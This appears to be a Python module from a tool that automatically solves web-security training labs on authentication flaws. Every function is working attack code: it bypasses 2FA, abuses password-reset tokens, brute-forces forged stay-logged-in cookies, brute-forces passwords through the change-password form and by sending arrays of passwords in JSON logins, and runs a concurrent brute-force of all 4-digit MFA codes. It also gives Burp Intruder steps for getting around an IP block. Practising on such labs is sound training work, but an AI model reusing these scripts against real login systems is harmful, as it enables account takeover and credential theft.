import modules.InputOperations as InputOperations
import modules.MenuOperations as MenuOperations
import modules.VisualEffects as VisualEffects
import modules.RequestOperations as request
import modules.ExitProgram as ExitProgram
import modules.CreateList as CreateList
import modules.Variables as Variables
import modules.Texts as Texts
import hashlib
import base64
import asyncio
import aiohttp
import re


def menu():
    MenuOperations.vulnerability_labs_menu("Authentication", {
            1: "2FA Simple Bypass",
            2: "Password reset broken logic",
            3: "Broken brute-force protection, IP block",
            4: "Brute-forcing a stay-logged-in cookie",
            5: "Password brute-force via password change",
            6: "Broken BF protection, multiple credentials per request",
            7: "2FA bypass using a brute-force attack"
    })
    

def solve_lab_1():
    VisualEffects.loading_effect("logging into account and bypassing 2FA verification...", 1.5)
    login_data = {"username": "carlos", "password": "montoya"}
    request.session.post(Variables.login_url, data=login_data, allow_redirects=False, verify=False, proxies=Variables.proxies)

    # Confirm bypass
    response = request.session.get(Variables.myaccount_url, verify=False, proxies=Variables.proxies)
    if Texts.log_out_text in response.text:
        VisualEffects.paas_ascii_art()
        print("[+] Successfully bypassed 2FA verification.")


def solve_lab_2():
    VisualEffects.loading_effect("changing carlos's password...", 1)
    pass_reset_url = Variables.url + "/forgot-password?temp-forgot-password-token=ilovekebap"
    pass_reset_data = {"temp-forgot-password-token": "ilovekebap", "username": "carlos", "new-password-1": "kebap", "new-password-2": "kebap"}
    request.session.post(pass_reset_url, data=pass_reset_data, verify=False, proxies=Variables.proxies)

    VisualEffects.loading_effect("logging into carlos's account...", 1)
    login_data = {"username": "carlos", "password": "kebap"}
    response = request.session.post(Variables.login_url, data=login_data, verify=False, proxies=Variables.proxies)

    # Confirm exploit worked
    if Texts.log_out_text in response.text:
        VisualEffects.paas_ascii_art()
        print("[+] Successfully logged into carlos's account.")


def solve_lab_3():
    print("This lab is not have fully automated solve in PAAS.")
    print("Follow the instructions for the solve the lab.")
    InputOperations.press_any_key()

    print("[1] Capture login request in Burp and right click send to Intruder")
    print("[2] Intruder -> Resource Pool -> select \"Create new resource pool\"\n-> select \"Maximum concurrent requests\" and set to 1")
    InputOperations.press_any_key()

    print("== Authentication/Broken brute-force protection, IP block ==\n")
    print("[3] Select \"Pitchfork\" attack type")
    print("[4] Positions -> click \"clear\", select both of username and password inputs and click \"add\"")
    print("example: \"username=§wiener§&password=§peter§\"")
    InputOperations.press_any_key()

    print("== Authentication/Broken brute-force protection, IP block ==\n")
    print("[5] Copy the user list after pressing any key and paste it for \"payload set 1\" in the \"Payloads\"")
    CreateList.user_list("Auth3")

    print("[6] Copy the pasword list after pressing any key and paste it for \"payload set 2\" in the \"Payloads\"")
    CreateList.password_list("Auth3")

    print("[7] Click \"Start attack\" and wait until the attack is over")
    print("[8] Sort the list by \"Status\" 302")
    print("[9] The password in the column where carlos is 302 is correct password")
    print("[10] Login to the site with this credentials and solve the lab")
    InputOperations.press_any_key()
    return 1


def solve_lab_4():
    print("\nGenerating cookies and running attack...")
    print("\nthis may take some time")

    with open("passlist", "r") as p:
        for pwd in p:
            hashed_pass = hashlib.md5(pwd.rstrip("\n").encode("utf-8")).hexdigest()
            username_hashed_pass = "carlos:" + hashed_pass
            encoded_pass = base64.b64encode(bytes(username_hashed_pass, "utf-8"))
            true_creds = encoded_pass.decode("utf-8")

            cookies = {"stay-logged-in": true_creds}
            response = request.session.get(Variables.myaccount_url, cookies=cookies, verify=False, proxies=Variables.proxies)
            if Texts.log_out_text in response.text:
                print(f"\n[+] Valid credentials found! Credentials: carlos:{pwd}")


def solve_lab_5():
    VisualEffects.loading_effect("logging into wiener's account...", 1)
    login_data = {"username": "wiener", "password": "peter"}
    request.session.post(Variables.login_url, data=login_data, verify=False, proxies=Variables.proxies)

    # Brute forcing carlos's account via password reset mechanism
    VisualEffects.loading_effect("brute force attack running...", 1)
    change_password_url = Variables.url + "/my-account/change-password"

    with open("passlist", "r") as f:
        lines = f.readlines()

    for pwd in lines:
        pwd = pwd.strip("\n")
        change_password_data = {"username": "carlos", "current-password": pwd, "new-password-1": "test", "new-password-2": "test2"}
        response = request.session.post(change_password_url, data=change_password_data, verify=False, proxies=Variables.proxies)

        # Verify brute force is working
        if "New passwords do not match" in response.text:
            print("[+] Carlos\'s password found: " + pwd)

            # Log into carlos's account
            VisualEffects.loading_effect("[+] logging into carlos's account...", 1)
            Variables.login_url = Variables.url + "/login"
            login_data = {"username": "carlos", "password": pwd}
            request.session.post(Variables.login_url, data=login_data, verify=False, proxies=Variables.proxies)


def solve_lab_6():
    VisualEffects.loading_effect(Variables.Variables.attacking_text, 1)

    password_list = []

    with open("passlist", "r") as doc:
        for line in doc:
            pwd = line.strip()
            password_list.append(pwd)

    headers = {"Content-Type": "application/json"}
    data = {"username": "carlos", "password": password_list}
    request.session.post(Variables.login_url, json=data, headers=headers, verify=False, proxies=Variables.proxies)


# this function is not working until next update
def solve_lab_7():
    mfa_second_login_screen_path = "/login2"
    print(Texts.attacking_text)
    print("This may take some time.")

    semaphore = asyncio.Semaphore(100)
    
    async def check_mfa_code(number):
        async with semaphore:
            try:
                async_session = await create_async_session()
                csrf_token = await get_csrf_token(async_session)
                data = {"csrf": csrf_token, "username": "carlos", "password": "montoya"}   
                async with async_session.post(Variables.login_url, data=data, ssl=False, proxy=Variables.proxy):
                    csrf_token = await get_csrf_token(async_session, mfa_second_login_screen_path)
                    data = {"csrf": csrf_token, "mfa-code": number}
                    async with async_session.post(mfa_second_login_screen_path, data=data, ssl=False, proxy=Variables.proxy) as response:
                        response_text = await response.text()
                        async_session.close()
                        if Texts.lab_solved_text in response_text:
                            ExitProgram.success()
                
            except aiohttp.ClientError:
                pass


    async def find_valid_mfa_code():
        tasks = []
        for i in range(0, 10000):
            number = "{:04}".format(i)
            task = asyncio.create_task(check_mfa_code(number))
            tasks.append(task)

        await asyncio.gather(*tasks)


    async def get_csrf_token(async_session, path=""):
        async with async_session.get(Variables.url + path, ssl=False, proxy=Variables.proxy) as response:
            html_content = await response.text()
            pattern = r'<input\s+required\s+type="hidden"\s+name="csrf"\s+value="(.*?)"\s*>'
            match = re.search(pattern, html_content)

            if match:
                csrf_token = match.group(1)
                return csrf_token


    async def create_async_session():
        connector = aiohttp.TCPConnector(limit=100)
        async_session = aiohttp.ClientSession(connector=connector)
        return async_session


    loop = asyncio.get_event_loop()
    loop.run_until_complete(find_valid_mfa_code())